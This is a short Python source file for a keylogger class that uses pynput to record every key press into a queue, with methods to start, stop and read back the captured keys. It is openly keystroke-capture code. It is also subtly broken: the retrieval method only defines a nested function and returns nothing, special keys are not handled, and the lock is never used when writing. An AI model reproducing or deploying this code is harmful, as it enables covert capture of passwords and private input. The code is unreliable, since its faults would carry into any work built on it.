from pynput import keyboard
import queue
import threading
from ikeylogger import IKeyLogger

class KeyLoggerService(IKeyLogger):
    def __init__(self, max_queue_size=1000):
        self.logged_keys = queue.Queue(maxsize=max_queue_size)
        self.listener = None
        self.lock = threading.Lock()
    def start_logging(self):
        def on_press(key):
            try:
                self.logged_keys.put(key.char)
            except queue.Full:
                pass
        self.listener = keyboard.Listener(on_press=on_press)
        self.listener.start()

    def stop_logging(self):
        if self.listener:
            self.listener.stop()
            self.listener.join()


    def get_logged_keys(self):
        def get_logged_keys(self):
            with self.lock:
                keys = []
                while not self.logged_keys.empty():
                    keys.append(self.logged_keys.get())
                return keys